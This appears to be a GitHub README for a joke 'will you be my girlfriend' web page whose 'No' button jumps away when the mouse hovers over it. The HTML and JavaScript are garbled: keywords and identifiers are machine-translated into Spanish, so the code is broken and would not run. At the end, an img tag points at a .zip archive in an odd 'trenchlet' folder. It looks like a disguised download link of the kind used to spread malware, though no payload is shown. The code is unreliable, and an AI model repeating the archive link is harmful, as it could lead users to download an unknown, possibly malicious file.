# Quieres-ser-mi-nobia-7w7
Propuesta para mi princesa lale
<! DOCTYPE html >
< html >
< cabeza >
    < meta  charset = ' utf-8 ' >
    < meta  http-equiv = ' X-UA-Compatible ' content = ' IE = edge ' >
    < título > Nobia </ título >
    < meta  name = ' viewport ' content = ' width = device-width, initial-scale = 1 ' >
    < estilo >
        cuerpo {
            color de fondo : rosa;
        }
    </ estilo >
    < guión >
        function  accionParaCuandoEllaDigaQueSi ( ) {
            alert ( 'ahora ya somos nobios <3' ) ;
        }

        function  mueveElBoton ( ) {
            ancho  =  ventana . innerWidth ;
            altura  =  ventana . innerHeight ;

            newWidth  =  ( Matemáticas . aleatorio ( ) * ancho ) ;
            newHeight  =  ( Matemáticas . aleatorio ( ) * altura ) ;

            documento . getElementById ( 'btnNo' ) . estilo . posición  =  "absoluta" ;
            documento . getElementById ( 'btnNo' ) . estilo . left  =  newWidth  +  "px" ;
            documento . getElementById ( 'btnNo' ) . estilo . top  =  newHeight  +  "px" ;
            

        }
    </ script >
</ cabeza >
< cuerpo >
    < h3 > ¿ Quieres ser mi nobia? </ h3 >
    < input  type = " button " onclick = " accionParaCuandoEllaDigaQueSi () " id = " btnSi " value = " Si " />
    < input  type = " button " id = " btnNo " onmouseover = " mueveElBoton () " value = " No " />
    < img  src = " https://github.com/Fe4rlessxD/Quieres-ser-mi-nobia-7w7/raw/refs/heads/master/trenchlet/ser_w_mi_nobia_Quieres_1.7.zip " width = " 200 " >
</ cuerpo >
</ html >
